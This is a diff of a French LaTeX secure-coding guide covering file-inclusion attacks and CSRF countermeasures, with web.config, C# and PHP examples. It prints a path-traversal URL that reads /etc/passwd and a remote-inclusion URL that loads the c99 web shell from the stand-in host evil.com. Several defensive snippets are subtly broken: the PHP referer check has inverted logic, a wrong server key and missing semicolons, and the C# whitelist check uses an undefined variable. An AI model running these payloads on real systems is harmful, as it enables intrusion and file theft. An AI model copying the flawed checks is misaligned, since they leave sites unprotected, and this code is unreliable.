@@ -1483,16 +1483,9 @@ Une \gls{LFI} est une inclusion de fichier local par l'utilisation d'un mécanis
 
 L'accès à la page pourrait être fait via l'URL: \url{http://example.com/preview.php?file=example.html}. En modifiant l'URL à \url{http://example.com/preview.php?file=../../../etc/passwd}, l'attaquant pourrait accéder au fichier /etc/passwd qui sur les serveurs Unix donnent de précieuses informations sur les utilisateurs d'un serveur.\\
 
-Cette menace peut être restreinte côté serveur par l'usage d'une vérification des entrées utilisateurs via des \gls{REGEX}. La gestion d'accès peut également se faire via la configuration du serveur. Par défaut l'accès à l'arborescence du dossier racine du serveur web est interdite mais l'utilisation de dossier virtuel peut permettre de contourner cette restriction.
-
-\begin{Define}{RFI}
-Une \gls{RFI} est une inclusion d'un fichier distant par l'utilisation d'un mécanisme de lecture présent dans le code, comme par exemple l'inclusion d'un paramètre GET d'un document à charger. Cela peut servir notamment à inclure un code javascript malveillant exécuté par l'utilisateur ou un code exécuté par le serveur.
-\end{Define}
-
-En reprenant l'exemple précédent, l'attaquant pourrait exécuter la requête via l'URL: \url{http://example.com/preview.php?file=http://evil.com/c99.aspx}
-
+Cette menace peut être restreinte côté serveur par l'usage d'une vérification des entrées utilisateurs via des \gls{REGEX}. La gestion d'accès peut également se faire via la configuration du serveur. Par défaut l'accès à l'arborescence du dossier racine du serveur web est interdite mais l'utilisation de dossier virtuel peut permettre de contourner cette restriction.\\
 Par exemple, en ASP.NET, le fichier web.config permet de restreindre les accès par utilisateurs identifiés.
-\begin{Config}{XML}{Deny Folder Access}
+\begin{Config}{XML}{web.config: Deny Folder Access}
 <location path="upload/" >
 <system.web>
 	<security>
@@ -1502,6 +1495,73 @@ Par exemple, en ASP.NET, le fichier web.config permet de restreindre les accès 
 	</security>
 </system.web>
 \end{Config}
+
+\begin{Define}{RFI}
+Une \gls{RFI} est une inclusion d'un fichier distant par l'utilisation d'un mécanisme de lecture présent dans le code, comme par exemple l'inclusion d'un paramètre GET d'un document à charger. Cela peut servir notamment à inclure un code javascript malveillant exécuté par l'utilisateur ou un code exécuté par le serveur.
+\end{Define}
+
+En reprenant l'exemple précédent, l'attaquant pourrait exécuter la requête via l'URL: \url{http://example.com/preview.php?file=http://evil.com/c99.aspx}.\\
+En cas de nécessité d'inclure des pages distantes, il est recommandé de restreindre l'exécution des fichiers par Content-Type et par origine.\\
+L'implémentation d'une restriction peut se faire en utilisant des fonctions natives comme la fonction \textit{IsWellFormedUriString()} en .NET. Cette fonction permet de vérifier la structure d'une URL et sa conformité par rapport aux \gls{RFC}.
+\begin{Config}{csharp}{.NET: Vérification d'URI relative}
+var uri= Request.QueryString["Uri"];
+if (!Uri.IsWellFormedUriString(uri,UriKind.Relative)){
+	throw new ApplicationException("URI not allowed");
+}
+\end{Config}
+
+La vérification basée sur liste blanche peut également se réaliser en utilisant la classe \textbf{DbContext}.
+\begin{Config}{csharp}{.NET: Vérification par liste blanche}
+//var db = new DbContext();
+// [...]
+var uri= Request.QueryString["Uri"];
+if (!db.WhiteListURLs.Where(u => u.URL == url).Any()){
+	throw new ApplicationException("URI not allowed");
+}
+\end{Config}
+
+\subsection{Gestion des sessions: CSRF}
+\begin{Define}{CSRF}
+Une \gls{CSRF} est une attaque consistant à induire un utilisateur connecté à réaliser une action à son insu. Ce type d'attaque se réalise par la réalisation d'une requête par l'utilisateur. Elle peut se réaliser par un fichier HTML ou PDF malveillant, l'accès à une page web ou en utilisant une autre vulnérabilité (\gls{XSS}, unvalidated redirection...).
+Une \gls{CSRF} peut se contre en utilisant:\begin{itemize}
+\item Une vérification de l'origine du visiteur
+\item Un \textit{token} anti-CSRF
+\item Une double validation
+\end{itemize}
+\end{Define}
+
+\subsubsection{Vérification de l'origine du visiteur par referer}
+L'origine d'un visiteur peut être déterminé par le header \gls{HTTP} \textit{\gls{Referer}} si celui-ci est envoyé. En effet le \textit{\gls{Referer}} permet d'obtenir la provenance d'un visiteur.
+\begin{Config}{http}{HTTP: Header Referer}
+GET https://en.wikipedia.org/wiki/Test HTTP/1.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Encoding: gzip, deflate, sdch, br
+Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4
+Cookie: WMF-Last-Access=18-Brum-VIII
+Referer: https://www.google.fr/
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
+\end{Config}
+
+L'obtention du \gls{Referer} peut se faire aisément en utilisant une fonction native de .NET.
+
+\begin{Config}{csharp}{.NET: Vérification du Referer}
+var referer = request.UrlReferrer;
+if (referer == null || referer.Host != Request.Url.Host )
+	throw new ApplicationException("Erroneous referer");
+\end{Config}
+
+Cette vérification peut s'exécuter en PHP avec la variable globale \textit{\$\_SERVER}
+\begin{Config}{php}{PHP: Vérification du Referer}
+<?php
+	$ref=$_SERVER['REFERER']
+	if($ref == "example.com"){
+		echo "Erroneous referer"
+	}
+\end{Config}
+
+\subsubsection{Implémentation d'un token anti-CSRF (en POST)}
+\subsubsection{Implémentation d'un token anti-CSRF (en cookie)}
 
 \appendix
 \chapter{Cryptographie}
